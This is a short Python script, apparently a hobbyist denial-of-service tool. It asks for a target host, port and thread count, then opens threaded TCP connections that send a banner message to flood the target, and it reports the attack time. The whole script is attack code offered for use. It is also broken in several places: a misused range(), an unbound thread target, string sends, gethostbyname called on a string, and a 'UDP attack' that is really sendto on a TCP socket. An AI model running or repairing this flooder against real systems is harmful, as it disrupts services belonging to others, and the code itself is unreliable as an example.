import socket
import threading
import time
from datetime import datetime


class DoS:
    def __init__(self, host, port, n_threads):
        self.host = host;
        self.port = port;
        self.n_threads = n_threads
        self.threads = []
        self.message = "====== DoS Attack ==========="

    def send_attack(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.host, self.port))
            s.send(self.message) # TCP Attack
            s.sendto(self.message, (self.host, self.port)) # UDP Attack
        except:
            pass
        s.close()

    def attack(self):
        for i in range(self.threads):
            t = threading.Thread(target = send_attack)
            self.threads.append(t)

        for i in self.threads:
            i.start()

        for i in self.threads:
            i.join()

host = input(' [*] Enter Target Host Address: ')
port = int(input(' [*] Enter Target Port to Attack: '))
threads = int(input(' [*] Enter number of Attacks: '))

host_ip = host.gethostbyname(host)

DoS = DoS(host, port, threads)

print('\n\n[*] Starting The Attack at %s... ' % (time.strftime("%H%M%S")))
start_time = datetime.now()

DoS.attack()
end_time = datetime.now()
total_time = end_time - start_time

print('\n\n[*] The Attack was done At %s... ' % (time.strftime("%H%M%S")))
print(' [*] Total Attack Time %s... ' %(total_time))





